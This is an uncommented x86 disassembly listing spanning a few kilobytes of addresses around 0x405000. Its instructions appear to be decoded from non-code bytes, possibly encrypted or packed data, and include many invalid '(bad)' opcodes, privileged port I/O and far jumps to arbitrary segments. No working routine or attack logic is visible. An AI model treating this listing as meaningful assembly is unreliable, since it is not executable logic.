  40503b:	repnz adc eax,edi
  40503e:	inc    ebx
  40503f:	mov    ecx,0x56dd7add
  405044:	xor    BYTE PTR [ebx],0x1c
  405047:	jg     0x4050c1
  405049:	loop   0x404fe8
  40504b:	inc    ebp
  40504c:	pop    ss
  40504d:	cmp    edi,ebp
  40504f:	outs   dx,DWORD PTR ds:[esi]
  405050:	sbb    DWORD PTR [edi+0x29999fb8],eax
  405056:	scas   eax,DWORD PTR es:[edi]
  405057:	push   edi
  405058:	mov    ds:0x68295184,al
  40505d:	and    eax,ebp
  40505f:	cmc    
  405060:	fld    DWORD PTR [esi+0x6277ac68]
  405066:	in     eax,0xfa
  405068:	ret    0xd404
  40506b:	add    al,0x60
  40506d:	aas    
  40506e:	sub    BYTE PTR [eax],bh
  405070:	adc    al,0x89
  405072:	mov    BYTE PTR [eax+0x399f2de2],ch
  405078:	xor    DWORD PTR [ebp-0x79669563],ebx
  40507e:	dec    eax
  40507f:	pushf  
  405080:	ss inc eax
  405082:	jns    0x4050ed
  405084:	repz mov bh,BYTE PTR [edi+0x3c]
  405088:	xbegin 0x3efbcde8
  40508e:	xchg   DWORD PTR [esi-0x58],esi
  405091:	add    edi,ecx
  405093:	cmp    BYTE PTR [eax+eiz*8],dl
  405096:	icebp  
  405097:	out    0xa4,eax
  405099:	in     eax,0xb6
  40509b:	nop
  40509c:	popf   
  40509d:	or     bl,BYTE PTR ds:0x8b4e94c4
  4050a3:	mov    bh,0xcf
  4050a5:	sbb    eax,0xc634a8aa
  4050aa:	mov    esp,0xac45f071
  4050af:	shr    bl,1
  4050b1:	inc    ebp
  4050b2:	lods   al,BYTE PTR ds:[esi]
  4050b3:	sbb    ah,BYTE PTR [ecx+0x6957dcff]
  4050b9:	pushf  
  4050ba:	enter  0x23b4,0xe4
  4050be:	int3   
  4050bf:	mov    eax,ds:0xb91a365a
  4050c4:	pop    ebx
  4050c5:	adc    ebp,edi
  4050c7:	dec    edi
  4050c8:	xor    DWORD PTR [edi+ebx*4],esi
  4050cb:	adc    al,BYTE PTR [edi-0x3a52b136]
  4050d1:	adc    bh,cl
  4050d3:	in     al,dx
  4050d4:	pop    eax
  4050d5:	idiv   DWORD PTR [edx+0x3b736e6b]
  4050db:	loop   0x4050dc
  4050dd:	cmp    DWORD PTR [ebx],ecx
  4050df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050e0:	pop    ecx
  4050e1:	cmp    DWORD PTR [eax+0x780964b2],edx
  4050e7:	pop    ebx
  4050e8:	adc    ah,BYTE PTR [edx]
  4050ea:	enter  0x6f33,0xbb
  4050ee:	and    ebx,DWORD PTR [edx+0x636e9684]
  4050f4:	sbb    al,0xae
  4050f6:	sbb    DWORD PTR [ecx-0x2a],esi
  4050f9:	ds mov dl,0x28
  4050fc:	or     DWORD PTR [edi],esp
  4050fe:	inc    esi
  4050ff:	int    0x68
  405101:	mov    DWORD PTR [edi+0x5ff294f6],esi
  405107:	lahf   
  405108:	sahf   
  405109:	jg     0x405179
  40510b:	xor    eax,0x624c782a
  405110:	pusha  
  405111:	dec    ebp
  405112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405113:	pop    esi
  405114:	jmp    0x7949:0x8a8e5e00
  40511b:	jmp    0xc9c0:0x39434d9e
  405122:	hlt    
  405123:	or     BYTE PTR [ebx],cl
  405125:	push   ebp
  405126:	ins    BYTE PTR es:[edi],dx
  405127:	sbb    esp,DWORD PTR [edi]
  405129:	mov    ds:0x3d029696,al
  40512e:	and    BYTE PTR [edi+esi*2-0x7647687a],bh
  405135:	cmp    eax,0x49284e5d
  40513a:	pop    esi
  40513b:	xor    BYTE PTR [edi+edi*2+0x3ade46ed],dl
  405142:	cmp    eax,DWORD PTR [ecx+0x63]
  405145:	push   esp
  405146:	into   
  405147:	aad    0x98
  405149:	push   eax
  40514a:	rcl    BYTE PTR [eax+edi*2+0x380778aa],cl
  405151:	in     al,dx
  405152:	mov    ds:0x9eb92cb3,al
  405157:	mov    cl,0x24
  405159:	pop    edi
  40515a:	es or  edx,esi
  40515d:	lock jecxz 0x40510f
  405160:	sbb    BYTE PTR [ecx+0xf],bh
  405163:	leave  
  405164:	sub    al,BYTE PTR [ecx]
  405166:	in     eax,dx
  405167:	sbb    DWORD PTR [esi-0x3aabb215],0xea07f0c9
  405171:	lock adc DWORD PTR [edi],eax
  405174:	(bad)  
  405176:	out    0x80,al
  405178:	lock popf 
  40517a:	mov    eax,0xbc6e8c5a
  40517f:	pause  
  405181:	adc    al,0xcc
  405183:	sbb    DWORD PTR [edi-0x23108b0f],ebp
  405189:	mov    eax,0x1897c37
  40518e:	scas   eax,DWORD PTR es:[edi]
  40518f:	push   edi
  405190:	nop
  405191:	cwde   
  405192:	pop    ecx
  405193:	ret    
  405194:	push   0x76
  405196:	or     edx,DWORD PTR [edi]
  405198:	sub    dl,BYTE PTR ds:0x7734cd9b
  40519e:	mov    al,ds:0xcec6652a
  4051a3:	jg     0x40520c
  4051a5:	cmp    eax,DWORD PTR [edi+0x5a4384a0]
  4051ab:	cmc    
  4051ac:	das    
  4051ad:	or     BYTE PTR [esi+0x7c],cl
  4051b0:	adc    eax,DWORD PTR [edi]
  4051b2:	fstp   QWORD PTR [esi+0x7157775a]
  4051b8:	ins    DWORD PTR es:[edi],dx
  4051b9:	cmp    DWORD PTR [ebx-0x251517d3],eax
  4051bf:	dec    esi
  4051c0:	(bad)
  4051c4:	loop   0x4051aa
  4051c6:	and    ch,BYTE PTR [edx-0x5c]
  4051c9:	mov    BYTE PTR [esi+0x568fa9f3],dh
  4051cf:	push   esp
  4051d0:	adc    edi,DWORD PTR [ebx+0x11]
  4051d3:	pop    eax
  4051d4:	add    BYTE PTR [ecx-0x6c19ad31],al
  4051da:	repnz mov ebp,ecx
  4051dd:	mov    ds:0xfa83f7c3,al
  4051e2:	pop    eax
  4051e3:	jo     0x405186
  4051e5:	cdq    
  4051e6:	xchg   eax,ebx
  4051e8:	push   ss
  4051e9:	(bad)  
  4051ea:	hlt    
  4051eb:	add    eax,eax
  4051ed:	xor    al,0xb9
  4051ef:	sbb    ebx,esi
  4051f1:	dec    edi
  4051f2:	(bad)  
  4051f3:	fisubr DWORD PTR [ebx+0x56]
  4051f6:	pop    fs
  4051f8:	push   ss
  4051f9:	pop    ecx
  4051fa:	dec    ebp
  4051fb:	gs xchg ecx,eax
  4051fd:	enter  0x55c,0xfe
  405201:	mov    ebp,0xf27a518f
  405206:	out    dx,al
  405207:	mov    ah,0x25
  405209:	mul    DWORD PTR [edi-0x41183ec3]
  40520f:	fdivr  DWORD PTR [edx]
  405211:	sub    esp,DWORD PTR [ecx-0x1c6d3f77]
  405217:	cmp    al,0x21
  405219:	mov    ah,0x5c
  40521b:	out    0xcf,al
  40521d:	jo     0x40527c
  40521f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405220:	mov    edi,0xe7fec5fb
  405225:	icebp  
  405226:	jle    0x4051a9
  405228:	xchg   esp,eax
  405229:	ret    
  40522a:	mov    dh,0xd6
  40522c:	sti    
  40522d:	mov    BYTE PTR ds:0x71a887bf,bl
  405233:	jbe    0x40522a
  405235:	sub    bh,BYTE PTR ds:0xb5fd2c5c
  40523b:	mov    dh,0xa5
  40523d:	jg     0x40528e
  40523f:	xchg   esp,eax
  405240:	xor    ebx,esi
  405242:	cmp    DWORD PTR [edi],edi
  405244:	xchg   BYTE PTR [edi+ecx*1-0x30],cl
  405248:	out    0xcb,eax
  40524a:	fxtract 
  40524c:	icebp  
  40524d:	mov    al,ds:0xfc316e6c
  405252:	dec    edx
  405253:	sbb    cl,BYTE PTR [edi-0x77]
  405256:	enter  0xe6a8,0xae
  40525a:	mov    ecx,?
  40525c:	jne    0x405200
  40525e:	xor    al,0x2b
  405260:	mov    edi,0xcac8d917
  405265:	fiadd  WORD PTR [ecx+eax*1]
  405268:	dec    ebp
  405269:	pop    eax
  40526a:	mov    ds:0x75739228,al
  40526f:	call   0xd706:0x1e3dae38
  405276:	cmp    al,dh
  405278:	jo     0x405291
  40527a:	sub    BYTE PTR [ebx+0x1f],ah
  40527d:	xchg   esp,eax
  40527e:	loopne 0x4052e9
  405280:	fiadd  DWORD PTR [edx-0x42]
  405283:	xor    DWORD PTR [esi-0x24f48a6b],esp
  405289:	xchg   ecx,eax
  40528a:	cmp    DWORD PTR [esi-0x41],eax
  40528d:	and    BYTE PTR [edi],0xb2
  405290:	icebp  
  405291:	cli    
  405292:	xor    al,0x1
  405294:	mov    edx,0xa51f71e6
  405299:	into   
  40529a:	clc    
  40529b:	add    eax,0xab5bbdd1
  4052a0:	jecxz  0x40530e
  4052a2:	scas   al,BYTE PTR es:[edi]
  4052a3:	mov    ?,esp
  4052a5:	pop    es
  4052a6:	jl     0x4052c3
  4052a8:	pop    ebx
  4052a9:	jbe    0x405272
  4052ab:	outs   dx,BYTE PTR ds:[esi]
  4052ac:	cwde   
  4052ad:	adc    DWORD PTR [ecx+0x5d],ebp
  4052b0:	or     dh,BYTE PTR [ebx-0x59]
  4052b3:	inc    eax
  4052b4:	inc    eax
  4052b5:	js     0x405313
  4052b7:	pop    ds
  4052b8:	pushf  
  4052b9:	ret    
  4052ba:	call   0x2d99:0x79eba71d
  4052c1:	mov    ch,0xb1
  4052c3:	lea    ecx,[esi]
  4052c5:	sbb    DWORD PTR [ecx+0x30b11aca],edi
  4052cb:	adc    eax,0x39222ec
  4052d0:	outs   dx,BYTE PTR ds:[esi]
  4052d1:	jmp    0x74a09ed3
  4052d6:	dec    esp
  4052d7:	inc    edx
  4052d8:	jp     0x405355
  4052da:	jno    0x40529e
  4052dc:	cdq    
  4052dd:	mov    bh,0x13
  4052df:	out    dx,al
  4052e0:	in     al,0x51
  4052e2:	test   BYTE PTR [ebx-0x41adfd0a],dh
  4052e8:	cmp    BYTE PTR [ebp+0x2ad36cd6],ah
  4052ee:	not    esp
  4052f0:	test   al,0x0
  4052f2:	int    0x55
  4052f4:	cld    
  4052f5:	jmp    0xdb8a:0x29b0a0f1
  4052fc:	and    DWORD PTR [ebx+0x397c3328],esi
  405302:	push   DWORD PTR [edx-0x7baec764]
  405308:	frstpm(287 only) 
  40530a:	popa   
  40530b:	push   edi
  40530c:	rcl    BYTE PTR [ecx+0x41053420],cl
  405312:	das    
  405313:	(bad)  
  405314:	mov    WORD PTR [eax+0x7c],es
  405317:	jmp    FWORD PTR [eax-0x28]
  40531a:	inc    ebx
  40531b:	pop    eax
  40531c:	mov    ebx,0xb27c58e1
  405321:	mov    esp,0x77f6f6fb
  405326:	ficomp DWORD PTR [esi]
  405328:	adc    eax,0x2b159d62
  40532d:	cld    
  40532e:	daa    
  40532f:	loopne 0x40538a
  405331:	push   esp
  405332:	in     al,dx
  405333:	dec    esp
  405334:	xor    al,0x23
  405336:	retf   0xc1c4
  405339:	mov    ebx,0x52e7c5d6
  40533e:	sar    edi,0xa0
  405341:	bound  esp,QWORD PTR [ebx]
  405343:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405346:	dec    edi
  405347:	pop    ebx
  405348:	jb     0x4052dd
  40534a:	jbe    0x40533d
  40534c:	xchg   al,bh
  40534e:	dec    ecx
  40534f:	adc    eax,0x60cd8173
  405354:	sahf   
  405355:	loop   0x405350
  405357:	xor    BYTE PTR [ebx+ebp*8-0x1d227ee3],0xfd
  40535f:	ja     0x40534f
  405361:	bound  ebp,QWORD PTR [edi]
  405363:	enter  0x48b8,0x7b
  405367:	stc    
  405368:	scas   eax,DWORD PTR es:[edi]
  405369:	jg     0x4053aa
  40536b:	hlt    
  40536c:	mov    eax,ds:0x97dd9aa6
  405371:	imul   ecx,DWORD PTR [eax],0xcdd5a92b
  405377:	scas   eax,DWORD PTR es:[edi]
  405378:	pop    ss
  405379:	push   es
  40537a:	or     eax,0x4072e40f
  40537f:	in     eax,0xdb
  405381:	jne    0x4053d6
  405383:	inc    ebx
  405384:	jl     0x405375
  405386:	xor    ah,BYTE PTR [ebp+0x7a9b3311]
  40538c:	mov    WORD PTR [ecx+0x6d],cs
  40538f:	aam    0x31
  405391:	cmp    DWORD PTR [edx],ebp
  405393:	adc    eax,0x64
  405396:	mov    ah,BYTE PTR [eax+edi*1]
  405399:	or     bl,0x30
  40539c:	(bad)  
  40539d:	jb     0x4053c7
  40539f:	or     edi,edx
  4053a1:	inc    eax
  4053a2:	leave  
  4053a3:	dec    esi
  4053a4:	mov    al,ds:0xcde0ceda
  4053a9:	out    dx,eax
  4053aa:	in     al,dx
  4053ab:	fisubr WORD PTR [edx+0x5019d648]
  4053b1:	pop    edx
  4053b2:	sub    al,0xf9
  4053b4:	aam    0xb7
  4053b6:	test   BYTE PTR [esi-0xf0cc273],ch
  4053bc:	scas   eax,DWORD PTR es:[edi]
  4053bd:	sbb    BYTE PTR [eax+0x68ce3351],0x2c
  4053c4:	mov    ebx,0xf736f472
  4053c9:	(bad)  
  4053ca:	or     al,0xcf
  4053cc:	fst    QWORD PTR [ecx+0x74946d56]
  4053d2:	jb     0x405448
  4053d4:	xchg   ebx,eax
  4053d5:	xor    BYTE PTR [ebx+edi*1-0x7db92757],bh
  4053dc:	data16 mov ah,0x22
  4053df:	jg     0x4053d7
  4053e1:	pop    ebp
  4053e2:	ds aam 0x53
  4053e5:	push   ecx
  4053e6:	pop    ebx
  4053e7:	dec    esp
  4053e8:	sbb    al,0xb
  4053ea:	jns    0x40543e
  4053ec:	mov    ds:0x29a0cd40,al
  4053f1:	jno    0x4053ea
  4053f3:	sbb    eax,0x1159c9a6
  4053f8:	ja     0x40538d
  4053fa:	jo     0x4053e5
  4053fc:	aad    0x8e
  4053fe:	xchg   edi,eax
  4053ff:	push   ds
  405400:	loope  0x40546a
  405402:	stos   BYTE PTR es:[edi],al
  405403:	sub    DWORD PTR [ebp+0x5185356e],edx
  405409:	xor    BYTE PTR gs:[ebx],dl
  40540c:	sbb    BYTE PTR [ecx],cl
  40540e:	pop    es
  40540f:	or     ah,al
  405411:	pop    edx
  405412:	pop    ebx
  405413:	dec    ebx
  405414:	add    al,0x4f
  405416:	dec    edi
  405417:	dec    esi
  405418:	(bad)  
  405419:	mov    edi,0xc9e361b1
  40541e:	and    bl,dl
  405420:	push   ss
  405421:	jmp    0x4053ba
  405423:	push   edi
  405424:	int    0x42
  405426:	stc    
  405427:	dec    DWORD PTR [eax+0x39cb3b87]
  40542d:	imul   eax,DWORD PTR [ecx+0x47c89b9b],0xffffff9b
  405434:	lock stc 
  405436:	push   0x75
  405438:	push   edi
  405439:	xor    eax,0x7b459fb9
  40543e:	cs xor eax,0xe32e91c5
  405444:	mov    bh,0xe4
  405446:	mov    dl,0x7b
  405448:	jmp    0x405446
  40544a:	pop    ecx
  40544b:	jno    0x405426
  40544d:	add    eax,0x1529bf1d
  405452:	or     BYTE PTR [ebp-0x442283b1],0x3
  405459:	or     eax,0xe99c4ea1
  40545e:	out    0xc5,eax
  405460:	cmc    
  405461:	and    eax,0x6621883f
  405466:	mov    ecx,0x98372c46
  40546b:	pop    eax
  40546c:	es pop esi
  40546e:	retf   
  40546f:	mov    bl,BYTE PTR [edi-0x12]
  405472:	outs   dx,BYTE PTR ds:[esi]
  405473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405474:	xlat   BYTE PTR ds:[ebx]
  405475:	std    
  405476:	stos   DWORD PTR es:[edi],eax
  405477:	add    eax,0x13093694
  40547c:	mov    ebp,esi
  40547e:	or     al,ah
  405480:	jp     0x40548a
  405482:	mov    ebx,edi
  405484:	xchg   ecx,eax
  405485:	pushf  
  405486:	ret    
  405487:	fcomp  st(3)
  405489:	jbe    0x405452
  40548b:	les    edi,FWORD PTR [edx+0x2f04c198]
  405491:	sub    esi,edi
  405493:	jmp    0xd38bd0bc
  405498:	inc    eax
  405499:	and    DWORD PTR [edi],edx
  40549b:	pop    ds
  40549c:	xchg   ch,bh
  40549e:	mov    bh,BYTE PTR [eax-0x32083032]
  4054a4:	leave  
  4054a5:	xchg   ecx,eax
  4054a6:	and    dl,BYTE PTR [ecx-0x1d]
  4054a9:	stos   DWORD PTR es:[edi],eax
  4054aa:	mov    al,ds:0xa4f634d3
  4054af:	out    dx,al
  4054b0:	mov    bl,0xf7
  4054b2:	cmc    
  4054b3:	fsubr  st,st(6)
  4054b5:	not    DWORD PTR ds:0xc3683621
  4054bb:	dec    edi
  4054bc:	test   al,0x5f
  4054be:	mov    eax,0x4c322029
  4054c3:	sub    ah,bl
  4054c5:	out    0x0,eax
  4054c7:	jo     0x4054ba
  4054c9:	sbb    bh,BYTE PTR [ecx+eiz*4+0x1f]
  4054cd:	frstor [edi+0x20]
  4054d0:	iret   
  4054d1:	mov    ?,WORD PTR [edx]
  4054d3:	outs   dx,BYTE PTR ds:[esi]
  4054d4:	ss mov dl,0xd
  4054d7:	cwde   
  4054d8:	sbb    esp,DWORD PTR [edi-0x55]
  4054db:	shl    BYTE PTR [ecx],cl
  4054dd:	sahf   
  4054de:	add    al,0x98
  4054e0:	(bad)  
  4054e1:	in     al,0xe
  4054e3:	retf   
  4054e4:	sbb    DWORD PTR ds:0x1c4ba50b,ecx
  4054ea:	sub    ebx,eax
  4054ec:	icebp  
  4054ed:	mov    esp,0xcdc033e6
  4054f2:	mov    eax,0xb82d1093
  4054f7:	jmp    0x6855:0xcce79808
  4054fe:	inc    esp
  4054ff:	sub    eax,DWORD PTR ds:0x1a85db1c
  405505:	push   cs
  405506:	dec    edx
  405507:	iret   
  405508:	xor    eax,0xeb3d0045
  40550d:	sub    DWORD PTR [ebp-0x4d],ebp
  405510:	ror    DWORD PTR [ebx+0x17],0xa1
  405514:	cwde   
  405515:	mov    esi,0xaf197f1b
  40551a:	in     al,dx
  40551b:	sub    eax,0x9bec0ecd
  405520:	push   ecx
  405521:	iret   
  405522:	mov    bh,dl
  405524:	scas   eax,DWORD PTR es:[edi]
  405525:	push   esi
  405526:	scas   eax,DWORD PTR es:[edi]
  405527:	and    eax,ebp
  405529:	test   al,0xa5
  40552b:	inc    ebx
  40552c:	cmc    
  40552d:	adc    al,0x8
  40552f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405530:	mov    esi,0xafdff064
  405535:	mov    bh,0x82
  405537:	adc    esp,DWORD PTR [edi-0x7b]
  40553a:	cmp    bh,BYTE PTR [eax+0x4bf57989]
  405540:	xchg   ebp,eax
  405541:	pop    edi
  405542:	cmp    ch,BYTE PTR [ebp+0x29]
  405545:	xor    eax,0x8c9ca385
  40554a:	xor    eax,0x33972e03
  40554f:	nop
  405550:	inc    eax
  405551:	ret    0xa601
  405554:	dec    edx
  405555:	test   DWORD PTR [ebx-0x3fd82f0c],eax
  40555b:	cmp    DWORD PTR [esi-0x4e],ebx
  40555e:	adc    dh,BYTE PTR [ebx]
  405560:	xor    ebp,esi
  405562:	into   
  405563:	mov    eax,ds:0x7e28a77b
  405568:	push   ecx
  405569:	xor    cl,BYTE PTR [ebx]
  40556b:	sbb    al,0x86
  40556d:	or     dh,BYTE PTR [edx+edx*4+0x1]
  405571:	imul   eax,DWORD PTR [ecx],0x5e
  405574:	inc    esp
  405575:	cmp    edi,DWORD PTR [edi+0x3c]
  405578:	inc    edx
  405579:	lds    esi,FWORD PTR [ecx-0x54]
  40557c:	xchg   esi,eax
  40557d:	sbb    al,0x88
  40557f:	pop    ds
  405580:	nop
  405581:	neg    BYTE PTR [ecx-0x60]
  405584:	push   ebx
  405585:	popf   
  405586:	xor    edx,ecx
  405588:	aad    0xe0
  40558a:	lock aam 0x5f
  40558d:	in     al,0xfb
  40558f:	push   ecx
  405590:	jne    0x405577
  405592:	xchg   edi,eax
  405593:	jns    0x405593
  405595:	shr    DWORD PTR [eax+0x49],cl
  405598:	jb     0x40552f
  40559a:	jmp    0xc9ad:0xc6af542
  4055a1:	mov    dl,0xc6
  4055a3:	(bad)  
  4055a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a5:	dec    eax
  4055a6:	and    al,0x82
  4055a8:	fucomip st,st(6)
  4055aa:	dec    ecx
  4055ab:	sti    
  4055ac:	mov    al,ds:0x280e5a39
  4055b1:	mov    bh,dh
  4055b3:	mov    dl,0x69
  4055b5:	xchg   ebp,eax
  4055b6:	and    esi,edx
  4055b8:	inc    ebp
  4055b9:	xchg   BYTE PTR [ebx+0x721248f7],bh
  4055bf:	icebp  
  4055c0:	mov    cl,0xf
  4055c2:	dec    ebx
  4055c3:	popa   
  4055c4:	mov    esp,0x82db9c94
  4055c9:	push   ebx
  4055ca:	cmp    ch,BYTE PTR ds:0x67612bd8
  4055d0:	fadd   DWORD PTR [ecx+0x40]
  4055d3:	(bad)  
  4055d5:	in     eax,0xf3
  4055d7:	jg     0x40560f
  4055d9:	fld    DWORD PTR [ebx]
  4055db:	rcl    BYTE PTR ds:0x40da4215,1
  4055e1:	push   eax
  4055e2:	sub    eax,DWORD PTR [ebx+edi*2]
  4055e5:	addr16 int3 
  4055e7:	es in  eax,0xf8
  4055ea:	aaa    
  4055eb:	ds imul ebx,DWORD PTR ss:[ebx+0x621b736a],0xb5ca0ffd
  4055f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055f8:	add    BYTE PTR [edx-0x42],ch
  4055fb:	fadd   DWORD PTR [edx+0x60026465]
  405601:	pop    edx
  405602:	out    dx,eax
  405603:	mov    esi,0xd2f51d62
  405608:	xlat   BYTE PTR ds:[ebx]
  405609:	retf   0xe253
  40560c:	fiadd  WORD PTR ds:0x3e710ac1
  405612:	aaa    
  405613:	mov    ds:0x2c6282d4,eax
  405618:	or     ah,BYTE PTR [esi+0x75]
  40561b:	les    esp,FWORD PTR [esp+edx*8]
  40561e:	pop    es
  40561f:	sub    eax,0x22a32418
  405624:	stc    
  405625:	add    eax,0xa66ea60
  40562a:	adc    al,0xb5
  40562c:	push   esp
  40562d:	jl     0x405608
  40562f:	fwait
  405630:	lahf   
  405631:	out    0x89,eax
  405633:	ds test bh,ch
  405636:	lea    edi,[ebx+0x5eb377ee]
  40563c:	mov    eax,0xc8d6983d
  405641:	rcr    DWORD PTR [edi+eax*8-0x58],1
  405645:	fcmovb st,st(3)
  405647:	mov    ah,0x96
  405649:	nop
  40564a:	push   ss
  40564b:	inc    ebp
  40564c:	xor    ebx,eax
  40564e:	es shl BYTE PTR es:[ecx+0x53],1
  405653:	xchg   edx,eax
  405654:	test   DWORD PTR [ecx+0x16426c5],ecx
  40565a:	cmp    al,0xd8
  40565c:	inc    ebp
  40565d:	aas    
  40565e:	sar    DWORD PTR [esi],cl
  405660:	dec    edx
  405661:	call   0x1e91:0x9c2ab06f
  405668:	ins    DWORD PTR es:[edi],dx
  405669:	std    
  40566a:	sub    esi,edi
  40566c:	jo     0x405668
  40566e:	(bad)  
  40566f:	out    0xe5,eax
  405671:	out    dx,eax
  405672:	ret    0xbc4
  405675:	jmp    0x405664
  405677:	aaa    
  405678:	sahf   
  405679:	push   cs
  40567a:	lock sub ebp,DWORD PTR [esi+0x5e]
  40567e:	and    ch,BYTE PTR [edx+0xb]
  405681:	and    dl,ah
  405683:	rol    DWORD PTR [edx],cl
  405685:	pop    ss
  405686:	push   es
  405687:	jge    0x4056a4
  405689:	lea    ebp,[eax]
  40568b:	outs   dx,DWORD PTR gs:[esi]
  40568d:	push   ebx
  40568e:	pop    ecx
  40568f:	adc    BYTE PTR ss:[edx+0x7944778c],0xb0
  405697:	fmul   QWORD PTR [eax]
  405699:	fstp   st(3)
  40569b:	xor    BYTE PTR [edi-0x61],bh
  40569e:	or     eax,0xf2d12523
  4056a3:	dec    esp
  4056a4:	jb     0x40562a
  4056a6:	jg     0x405663
  4056a8:	out    0xcc,al
  4056aa:	jg     0x40562e
  4056ac:	mov    ecx,0xe2cf4d92
  4056b1:	std    
  4056b2:	mov    al,ds:0xcfc2d1b6
  4056b7:	push   es
  4056b8:	rol    DWORD PTR [eax+0x3784069],cl
  4056be:	ror    DWORD PTR [ecx],cl
  4056c0:	cmp    cl,bl
  4056c2:	lods   eax,DWORD PTR ds:[esi]
  4056c3:	inc    ebx
  4056c4:	les    esi,FWORD PTR [esp+edx*1-0x1a]
  4056c8:	jne    0x40573e
  4056ca:	inc    eax
  4056cb:	add    cl,bl
  4056cd:	(bad)  
  4056ce:	int3   
  4056cf:	sar    DWORD PTR [eax-0x95bcbcd],0x6f
  4056d6:	xchg   DWORD PTR [ecx+0x55f2dca9],edi
  4056dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056dd:	(bad)  
  4056de:	scas   al,BYTE PTR es:[edi]
  4056df:	(bad)  
  4056e0:	jb     0x405683
  4056e2:	xchg   edi,eax
  4056e3:	mov    esp,fs
  4056e5:	add    al,BYTE PTR [ebp+0x23]
  4056e8:	icebp  
  4056e9:	aas    
  4056ea:	aam    0x14
  4056ec:	test   DWORD PTR [eax+0x2ebfe895],edi
  4056f2:	clc    
  4056f3:	cmp    eax,0x796151f6
  4056f8:	mov    ebx,0xd61d9ae2
  4056fd:	xchg   ebx,eax
  4056fe:	jg     0x405710
  405700:	xchg   ebp,eax
  405701:	dec    eax
  405702:	push   cs
  405703:	cmp    dl,BYTE PTR [ebx]
  405705:	mov    esi,0x28ceeeec
  40570a:	pop    es
  40570b:	dec    eax
  40570c:	ror    BYTE PTR [eax-0xe],cl
  40570f:	dec    ebp
  405710:	adc    esi,edx
  405712:	lods   al,BYTE PTR ds:[esi]
  405713:	stc    
  405714:	sar    DWORD PTR [edi-0x3d],0x60
  405718:	icebp  
  405719:	outs   dx,DWORD PTR ds:[esi]
  40571b:	cmp    ah,BYTE PTR [ebp-0x45]
  40571e:	mov    edi,0x9de32d69
  405723:	inc    esp
  405724:	pop    edx
  405725:	mov    edi,0x29e90431
  40572a:	imul   esp,DWORD PTR [edx-0x4ac90dd6],0xffffff89
  405731:	sub    al,ch
  405733:	sub    BYTE PTR [ebx+0x77],cl
  405736:	cmp    al,0x12
  405738:	loopne 0x4056c7
  40573a:	adc    al,0x2
  40573c:	sbb    ebx,DWORD PTR [ecx]
  40573e:	dec    ebp
  40573f:	scas   al,BYTE PTR es:[edi]
  405740:	pop    ds
  405741:	icebp  
  405742:	call   0x7797:0xbe45a1ab
  405749:	dec    edx
  40574a:	mov    ds:0xeb28e86e,al
  40574f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405750:	sub    eax,0x80aa9402
  405755:	in     eax,0x47
  405757:	shl    DWORD PTR [esp+eax*1],1
  40575a:	mov    edx,0x78a0a34e
  40575f:	div    dl
  405761:	out    dx,eax
  405762:	cmp    DWORD PTR [ecx],0x37
  405765:	in     al,dx
  405766:	ins    DWORD PTR es:[edi],dx
  405767:	sub    al,0xb3
  405769:	sbb    edi,esi
  40576b:	loope  0x405758
  40576d:	addr16 mov al,ds:0x6a75
  405771:	jne    0x4057c9
  405773:	aaa    
  405774:	addr16 (bad) 
  405776:	mov    edx,0x83648274
  40577b:	or     dl,al
  40577d:	push   ss
  40577e:	add    bl,BYTE PTR [ebx+0x1e]
  405781:	cld    
  405782:	(bad)  
  405783:	push   esp
  405784:	lock scas eax,DWORD PTR es:[edi]
  405786:	sub    al,BYTE PTR [ebx+0x43dd695e]
  40578c:	inc    esp
  40578d:	fcmovb st,st(2)
  40578f:	add    DWORD PTR [ebx],ebp
  405791:	les    ecx,FWORD PTR ss:[ebx-0xe35bd5c]
  405798:	fs or  al,0xb1
  40579b:	jl     0x40579b
  40579d:	(bad)  
  40579e:	jl     0x4057f2
  4057a0:	repnz mov al,ds:0x19ecd4e0
  4057a6:	js     0x40581a
  4057a8:	mov    esi,ebp
  4057aa:	cmp    eax,DWORD PTR [ebp-0x1b]
  4057ad:	pusha  
  4057ae:	xor    BYTE PTR [eax+ecx*8+0x1269555c],0x6b
  4057b6:	sub    DWORD PTR [edx+0x21],esp
  4057b9:	mov    WORD PTR [edx-0x78],es
  4057bc:	lods   eax,DWORD PTR ds:[esi]
  4057bd:	pop    eax
  4057be:	bound  ebx,QWORD PTR [edi-0x1b93742c]
  4057c4:	xor    eax,0xb55c262c
  4057c9:	xor    ecx,DWORD PTR [edx-0x3bdd0621]
  4057cf:	add    BYTE PTR [ebx],al
  4057d1:	aad    0xd3
  4057d3:	or     BYTE PTR [ebp-0x7a],dh
  4057d6:	cld    
  4057d7:	sti    
  4057d8:	sbb    BYTE PTR [edi-0xb],dh
  4057db:	jle    0x405818
  4057dd:	test   al,0x1
  4057e0:	mov    esp,0x17a00066
  4057e5:	(bad)  
  4057e7:	dec    ebp
  4057e8:	mov    ch,0x96
  4057ea:	push   ecx
  4057eb:	push   esi
  4057ec:	mov    WORD PTR [eax],?
  4057ee:	(bad)  
  4057f0:	adc    esp,DWORD PTR ds:0xbfbc303
  4057f6:	jno    0x40580b
  4057f8:	push   eax
  4057f9:	addr16 test eax,0xed258deb
  4057ff:	mov    ebp,DWORD PTR [eax]
  405801:	mov    dl,0xe6
  405803:	fs cmp al,0x7e
  405806:	outs   dx,DWORD PTR ds:[esi]
  405807:	scas   al,BYTE PTR es:[edi]
  405808:	sub    ebp,DWORD PTR [edi]
  40580a:	in     al,0xa5
  40580c:	ja     0x405834
  40580e:	mov    esi,0x60d06429
  405813:	test   DWORD PTR [ecx-0x3c9ce4d9],ebp
  405819:	sbb    al,0x98
  40581b:	in     al,0x27
  40581d:	jns    0x4057b8
  40581f:	cmp    eax,0xbb42b750
  405824:	cs ins BYTE PTR es:[edi],dx
  405826:	dec    esi
  405827:	dec    eax
  405828:	pop    ebp
  405829:	in     eax,0x97
  40582b:	ret    
  40582c:	dec    esp
  40582d:	je     0x4057f3
  40582f:	and    BYTE PTR [eax],cl
